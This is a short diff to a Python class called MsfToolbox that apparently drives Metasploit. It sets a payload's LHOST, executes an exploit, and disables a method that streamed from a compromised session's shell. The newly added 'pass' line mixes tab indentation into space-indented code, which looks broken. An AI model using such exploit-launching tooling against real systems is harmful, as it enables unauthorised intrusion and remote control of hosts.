@@ -58,7 +58,7 @@ class MsfToolbox:
         pl['LHOST'] = self._ip
         pl['EXITFUNC'] = 'thread'
 
-        exploit.execute(payload=pl, ExitOnSession=False)
+        exploit.execute(payload=pl)
 
     def get_ip_address(self, ifname):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -213,8 +213,9 @@ class MsfToolbox:
 
         
     def live_update_frame(self, session):
-        shell = self.get_session_shell(session)
-        shell.update_streaming_flag()
+	pass
+        #shell = self.get_session_shell(session)
+        #shell.update_streaming_flag()
         
 
     def get_live_url(self):
